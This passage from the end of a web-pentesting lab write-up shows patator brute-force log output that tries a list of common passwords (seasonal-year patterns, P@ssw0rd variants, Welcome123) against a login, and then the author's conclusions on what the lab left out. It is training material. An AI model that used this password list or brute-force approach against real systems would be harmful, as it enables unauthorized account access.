14:16:18 patator    INFO - 200  4735:4463      1.001 | summer2017                         |    16 | HTTP/1.1 200 OK
14:16:21 patator    INFO - 200  4735:4463      3.004 | summer2016                         |    17 | HTTP/1.1 200 OK
14:16:24 patator    INFO - 200  4735:4463      3.004 | summer2015                         |    18 | HTTP/1.1 200 OK
14:16:26 patator    INFO - 200  4735:4463      2.004 | summer2014                         |    19 | HTTP/1.1 200 OK
14:16:26 patator    INFO - 200  4735:4463      0.004 | summer2013                         |    20 | HTTP/1.1 200 OK
14:16:27 patator    INFO - 200  4735:4463      1.004 | Autumn2017                         |    21 | HTTP/1.1 200 OK
14:16:30 patator    INFO - 200  4735:4463      3.003 | Autumn2016                         |    22 | HTTP/1.1 200 OK
14:16:30 patator    INFO - 200  4735:4463      0.001 | Autumn2015                         |    23 | HTTP/1.1 200 OK
14:16:32 patator    INFO - 200  4735:4463      2.002 | Autumn2014                         |    24 | HTTP/1.1 200 OK
14:16:35 patator    INFO - 200  4735:4463      3.004 | Autumn2013                         |    25 | HTTP/1.1 200 OK
14:16:36 patator    INFO - 200  4735:4463      1.004 | autumn2017                         |    26 | HTTP/1.1 200 OK
14:16:37 patator    INFO - 200  4735:4463      1.001 | autumn2016                         |    27 | HTTP/1.1 200 OK
14:16:38 patator    INFO - 200  4735:4463      1.001 | autumn2015                         |    28 | HTTP/1.1 200 OK
14:16:40 patator    INFO - 200  4735:4463      2.002 | autumn2014                         |    29 | HTTP/1.1 200 OK
14:16:40 patator    INFO - 200  4735:4463      0.004 | autumn2013                         |    30 | HTTP/1.1 200 OK
14:16:43 patator    INFO - 200  4735:4463      3.004 | Winter2017                         |    31 | HTTP/1.1 200 OK
14:16:43 patator    INFO - 200  4735:4463      0.004 | Winter2016                         |    32 | HTTP/1.1 200 OK
14:16:43 patator    INFO - 200  4735:4463      0.003 | Winter2015                         |    33 | HTTP/1.1 200 OK
14:16:43 patator    INFO - 200  4735:4463      0.001 | Winter2014                         |    34 | HTTP/1.1 200 OK
14:16:47 patator    INFO - 200  4735:4463      3.001 | Winter2013                         |    35 | HTTP/1.1 200 OK
14:16:49 patator    INFO - 200  4735:4463      2.004 | winter2017                         |    36 | HTTP/1.1 200 OK
14:16:49 patator    INFO - 200  4735:4463      0.003 | winter2016                         |    37 | HTTP/1.1 200 OK
14:16:52 patator    INFO - 200  4735:4463      3.003 | winter2015                         |    38 | HTTP/1.1 200 OK
14:16:53 patator    INFO - 200  4735:4463      1.004 | winter2014                         |    39 | HTTP/1.1 200 OK
14:16:53 patator    INFO - 200  4735:4463      0.003 | winter2013                         |    40 | HTTP/1.1 200 OK
14:16:53 patator    INFO - 200  4735:4463      0.001 | P@55w0rd                           |    41 | HTTP/1.1 200 OK
14:16:56 patator    INFO - 200  4735:4463      3.002 | P@ssw0rd!                          |    42 | HTTP/1.1 200 OK
14:16:58 patator    INFO - 200  4735:4463      2.003 | P@55w0rd!                          |    43 | HTTP/1.1 200 OK
14:17:01 patator    INFO - 200  4735:4463      3.004 | sqlsqlsqlsql                       |    44 | HTTP/1.1 200 OK
14:17:01 patator    INFO - 200  4735:4463      0.004 | SQLSQLSQLSQL                       |    45 | HTTP/1.1 200 OK
14:17:03 patator    INFO - 200  4735:4463      2.004 | Welcome123                         |    46 | HTTP/1.1 200 OK
14:17:03 patator    INFO - 200  4735:4463      0.004 | Welcome1234                        |    47 | HTTP/1.1 200 OK
14:17:06 patator    INFO - 200  4735:4463      3.003 | Welcome1212                        |    48 | HTTP/1.1 200 OK
14:17:08 patator    INFO - 200  4735:4463      2.003 | PassSql12                          |    49 | HTTP/1.1 200 OK
14:17:10 patator    INFO - 200  4735:4463      2.004 | network                            |    50 | HTTP/1.1 200 OK
14:17:11 patator    INFO - 200  4735:4463      1.004 | networking                         |    51 | HTTP/1.1 200 OK
14:17:11 patator    INFO - 200  4735:4463      0.004 | networks                           |    52 | HTTP/1.1 200 OK
14:17:13 patator    INFO - 200  4735:4463      2.004 | test                               |    53 | HTTP/1.1 200 OK
14:17:15 patator    INFO - 200  4735:4463      2.004 | testtest                           |    54 | HTTP/1.1 200 OK
14:17:16 patator    INFO - 200  4735:4463      1.004 | testing                            |    55 | HTTP/1.1 200 OK
14:17:16 patator    INFO - 200  4735:4463      0.003 | testing123                         |    56 | HTTP/1.1 200 OK
14:17:18 patator    INFO - 200  4735:4463      2.002 | testsql                            |    57 | HTTP/1.1 200 OK
14:17:20 patator    INFO - 200  4735:4463      2.004 | test-sql3                          |    58 | HTTP/1.1 200 OK
14:17:21 patator    INFO - 200  4735:4463      1.004 | sqlsqlsqlsqlsql                    |    59 | HTTP/1.1 200 OK
14:17:24 patator    INFO - 200  4735:4463      3.004 | bankbank                           |    60 | HTTP/1.1 200 OK
14:17:24 patator    INFO - 200  4735:4463      0.004 | default                            |    61 | HTTP/1.1 200 OK
14:17:27 patator    INFO - 200  4735:4463      3.004 | test                               |    62 | HTTP/1.1 200 OK
14:17:27 patator    INFO - 200  4735:4463      0.004 | testing                            |    63 | HTTP/1.1 200 OK
14:17:30 patator    INFO - 200  4735:4463      3.004 | password2                          |    64 | HTTP/1.1 200 OK
14:17:31 patator    INFO - 200  4735:4463      1.004 |                                    |    65 | HTTP/1.1 200 OK
14:17:31 patator    INFO - 200  4773:4501      0.004 | password                           |    66 | HTTP/1.1 200 OK
14:17:31 patator    INFO - Hits/Done/Skip/Fail/Size: 66/66/0/0/222, Avg: 0 r/s, Time: 0h 1m 35s
14:17:31 patator    INFO - To resume execution, pass --resume 66

```
### Conclusions

This practice has covered some of the most relevant attack vectors in general (especially in the web world), it has been an interesting and fun practice to perform.

However, it is worth mentioning that the practice is unrealistic for the following reasons:

- The attacks are unconnected to each other, in a real scenario one would be performed first which would unlock the possibility to perform another one....
- Providing the source code completely eliminates the experience of "banging your head against a wall", since at any time you can "cheat" and look up the exact code to find out how to exploit it.
- The exploited machine completely eliminates the essential step of pre-scanning with tools such as nmap.
- Despite being a machine dedicated to learning web pentesting, it lacks fundamental aspects such as the discovery of hidden directories with tools like dirsearch, the discovery of subdomains with tools like godirbuster and the exploitation of vulnerabilities in both libraries in a specific version X with a known exploit Y associated with that version, as well as completely leaving aside the attack on common CMS (Content Manager Services) such as Wordpress or Joomla.
- Other stages of the pentest that have been missing throughout the practice have been the lateral displacements (since it is a single machine and it is not necessary to change users...), as well as the stage of privilege escalation to execute commands such as `root` and finally the persistence stage to ensure permanent access and the elimination of the trace originated during the attack and to ensure invisibility for future accesses to the Blue Team.
- As a pentest, it was also necessary to learn how to make a professional documentation of the pentest, following the MITRE framework and explaining the CVEs and CWEs exploited.

Despite these shortcomings, it has been a good practice to learn and put into practice new skills.